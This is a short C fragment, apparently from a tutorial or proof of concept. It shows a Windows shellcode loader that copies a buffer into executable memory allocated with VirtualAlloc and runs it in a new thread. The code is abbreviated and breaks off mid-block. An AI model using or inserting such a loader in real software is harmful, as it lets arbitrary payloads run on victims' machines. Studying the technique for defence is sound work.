...
int main(int argc, char* argv[])
{
    ...
    // Allocate executable virtual memory to hold chunk.buff
    const char* ptr = VirtualAlloc(NULL, chunk.prevSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (ptr == NULL)
    {
        printf("VirtualAlloc failed with: %lu\n", GetLastError());
        exit(-1);
    }
    memcpy(ptr, chunk.buff, chunk.prevSize);

    // Create thread to execute shellcode in virtual memory
    const HANDLE* hCalc = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ptr, NULL, 0, NULL);
    if (hCalc == NULL)
    {
